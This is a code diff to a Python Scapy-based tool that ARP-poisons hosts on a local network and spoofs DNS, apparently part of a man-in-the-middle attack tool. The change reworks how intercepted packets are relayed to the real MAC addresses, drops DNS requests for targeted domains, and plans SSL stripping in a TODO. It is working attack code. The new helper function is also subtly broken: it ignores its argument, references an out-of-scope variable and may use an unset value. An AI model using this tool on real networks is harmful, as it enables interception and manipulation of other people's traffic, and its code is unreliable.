@@ -1,6 +1,7 @@
 from scapy import packet
 from scapy.layers.dns import DNSQR, DNS
-from scapy.layers.l2 import ARP
+from scapy.layers.l2 import ARP, Ether
+from scapy.layers.inet import IP
 from scapy.sendrecv import sendp, sniff
 from scapy.arch import get_if_addr
 import threading
@@ -31,23 +32,41 @@ class Forwarding(threading.Thread):
 
     def run(self):
 
+        def get_original_mac(ip_addr: str) -> str:
+            # Get correct (non-spoofed) mac address corresponding to the IP of the received packet
+            for mac in self.hosts[self.interface]:
+                for ip in self.hosts[self.interface][mac]:
+                    if ip == received_packet[ARP].pdst:
+                        return mac
+
         def forward(received_packet: packet) -> None:
-            if ARP not in received_packet:
-                return
             # Packet is a DNS request that will be spoofed?
-            elif DNS in received_packet and received_packet[DNS].qr == 0 and \
+            if DNS in received_packet and received_packet[DNS].qr == 0 and \
                     (received_packet[DNSQR].qname.decode("utf8")[:-1] in self.domain_names):
                 # TODO: For now DNS request for spoofed domains are simply dropped,
                 #  in the future they should be forwarded with SSL stripping
                 return
-            # Packet was sent by a poisoned host?
-            elif received_packet[ARP].pdst != self.host_ip:
-                # Get correct (non-spoofed) mac address corresponding to the IP of the received packet
-                for mac in self.hosts[self.interface]:
-                    for ip in self.hosts[self.interface][mac]:
-                        if ip == received_packet[ARP].pdst:
-                            received_packet[ARP].dst = mac
-                sendp(received_packet, iface=self.interface, verbose=False)
+
+            # Packet is meant for host?
+            elif IP in received_packet and received_packet[IP].dst == self.host_ip:
+                return
+
+            else:
+                if Ether in received_packet:
+                    if ARP in received_packet:
+                        correct_mac = get_original_mac(received_packet[ARP].pdst)
+                    elif IP in received_packet:
+                        correct_mac = get_original_mac(received_packet[IP].dst)
+                    else:
+                        print("Failed to forward packet")
+                        received_packet.show()
+
+                    received_packet[Ether].dst = correct_mac
+
+                    sendp(received_packet, iface=self.interface, verbose=False)
+                else:
+                    print("Packet without Ether received:")
+                    received_packet.show()
 
         print("Now forwarding spoofed ARP and DNS packets...")
         while True:
